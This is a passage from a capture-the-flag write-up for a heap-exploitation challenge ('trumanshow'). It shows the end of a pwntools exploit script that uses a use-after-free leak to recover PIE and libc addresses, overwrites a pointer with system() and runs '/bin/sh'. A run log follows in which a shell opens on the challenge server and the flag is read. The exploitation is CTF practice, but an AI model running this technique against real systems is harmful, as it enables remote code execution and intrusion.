    rewrite(p, 9, fake3)

    log.info("Overwriting cue of segment 9 with system()")
    rewrite(p, 7, p64(system_addr))

    # 10. Tulis /bin/sh ke script buffer segment 9 (dengan padding 0x28)
    log.info("Writing /bin/sh to script buffer of segment 9")
    rewrite(p, 9, b"/bin/sh\x00".ljust(0x28, b"\x00"))

    # 11. Trigger play(9)
    log.info("Triggering play(9) to get shell")
    play(p, 9)
    p.interactive()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--remote', action='store_true')
    parser.add_argument('host', nargs='?', default='localhost')
    parser.add_argument('port', nargs='?', type=int, default=6007)
    args = parser.parse_args()

    if args.remote:
        p = remote(args.host, args.port)
    else:
        p = process([exe])
    exploit(p)
```

Implement

```bash
~/ctf/beectf/pwn/trumanshow 11s
❯ python3 solve.py --remote 103.185.52.197 6007                                  󰥔 19:37:00
[*] '/home/claritys/ctf/beectf/pwn/trumanshow/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[*] '/home/claritys/ctf/beectf/pwn/trumanshow/truman_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 103.185.52.197 on port 6007: Done
[*] Creating 9 segments with script 0x38
[*] Free 0..6 to fill tcache
[*] Free 7 and 8 -> fastbin
[*] Reading fd fastbin from title of Segment 8
[*] fd: 0x64b0d737e680
[*] seg7: 0x64b0d737e690
[*] seg8: 0x64b0d737e720
[*] cue_addr: 0x64b0d737e748
[*] Alloc segment 9 with script 0x28 (overlap)
[*] Leaking default_cue via UAF (review 7)
[*] default_cue: 0x64b0a7614820
[*] PIE base: 0x64b0a7613000
[*] puts@GOT: 0x64b0a7617028
[*] puts address: 0x7c48f1d90420
[*] libc base: 0x7c48f1d0c000
[*] system: 0x7c48f1d5e290
[*] /bin/sh: 0x7c48f1ec05bd
[*] Setting seg7->script to cue_addr
[*] Overwriting cue of segment 9 with system()
[*] Writing /bin/sh to script buffer of segment 9
[*] Triggering play(9) to get shell
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd home
$ ls
truman
$ cd truman
$ ls
flag.txt
truman
$ cat flag.txt
BeeCTF{gut3nm0rg3n_s3l4m4ts14ng_k0nb4w4!}
$ id
uid=1000(truman) gid=1000(truman) groups=1000(truman)
$ whoami
truman
```

#### Link AI:

[**https://chat.deepseek.com/share/cdb1ocy3cmkjfu0wl0**](https://chat.deepseek.com/share/cdb1ocy3cmkjfu0wl0)
